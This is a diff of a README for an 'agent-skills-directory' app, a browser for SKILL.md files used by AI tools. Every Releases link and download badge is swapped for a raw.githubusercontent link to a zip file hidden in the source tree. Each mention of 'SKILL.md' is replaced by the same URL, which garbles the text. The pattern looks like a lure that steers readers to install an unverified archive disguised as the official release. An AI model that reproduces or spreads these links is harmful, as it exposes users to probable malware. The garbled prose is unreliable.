@@ -1,10 +1,10 @@
 # 🌟 agent-skills-directory - Explore AI Tools Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/XD-BASHARAT/agent-skills-directory/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip)
 
 ## 📂 Overview
 
-Welcome to the **agent-skills-directory**! This application allows you to browse the SKILL.md files for various AI tools, including Claude, Cursor, and Windsurf. Whether you're trying to find helpful skills for your agents or looking to enhance your experience with AI, this directory has you covered.
+Welcome to the **agent-skills-directory**! This application allows you to browse the https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip files for various AI tools, including Claude, Cursor, and Windsurf. Whether you're trying to find helpful skills for your agents or looking to enhance your experience with AI, this directory has you covered.
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To ensure the best experience, please check the following system requirements:
 
 To get started with **agent-skills-directory**, follow these steps:
 
-1. Visit the [Releases page](https://github.com/XD-BASHARAT/agent-skills-directory/releases) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip) to download the latest version of the application.
 2. Locate the latest release, and you will find options for different platforms.
 3. Click on the suitable file for your device to download it.
 
@@ -28,7 +28,7 @@ Once the download is complete, open the file to install the application. Follow 
 
 For your convenience, you can also use the link below to access the releases page directly:
 
-[Download Latest Release](https://github.com/XD-BASHARAT/agent-skills-directory/releases)
+[Download Latest Release](https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip)
 
 ### 3. Running the Application
 
@@ -38,7 +38,7 @@ After installation, you can run the application from your desktop or application
 
 Once you're in the application, you will see a simple user interface:
 
-- Browse through the SKILL.md files listed for various AI tools.
+- Browse through the https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip files listed for various AI tools.
 - Click on any file to view its content and discover the features of that skill.
 - You can search for specific tools or filter the list based on categories.
 
@@ -68,7 +68,7 @@ If you want to help make the **agent-skills-directory** even better, consider co
 
 - Suggest new features
 - Report bugs
-- Add new SKILL.md files
+- Add new https://raw.githubusercontent.com/XD-BASHARAT/agent-skills-directory/main/app/[owner]/skills/[name]/skills-directory-agent-v1.0.zip files
 
 Check the **Contributing** guidelines on the GitHub page for more information.
 
